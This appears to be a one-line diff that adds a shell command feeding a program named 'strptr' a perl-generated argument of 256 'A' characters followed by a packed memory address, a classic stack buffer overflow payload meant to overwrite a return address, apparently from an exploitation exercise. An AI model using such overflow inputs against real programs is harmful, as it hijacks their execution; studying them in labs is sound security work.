@@ -1,0 +1,2 @@
+./strptr `perl -e 'print "A"x256; print "\x62\x85\x04\x08"'`
+
